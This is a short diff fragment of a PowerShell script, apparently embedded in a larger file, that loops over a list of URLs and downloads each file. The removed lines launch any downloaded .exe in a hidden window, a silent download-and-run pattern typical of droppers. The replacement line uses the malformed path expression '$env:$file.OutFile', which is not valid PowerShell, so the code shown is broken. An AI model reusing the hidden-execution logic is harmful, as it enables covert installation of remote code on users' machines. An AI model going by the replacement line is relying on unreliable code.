@@ -6,9 +6,6 @@ $files = @(
 )
 
 foreach ($file in $files) {
-    Invoke-WebRequest -Uri $file.Uri -OutFile $file.OutFile
-    if ($file.Uri -like '*.exe') {
-        Start-Process -WindowStyle Hidden $file.OutFile
-    }
+    Invoke-WebRequest -Uri $file.Uri -OutFile $env:$file.OutFile
 }
 "@
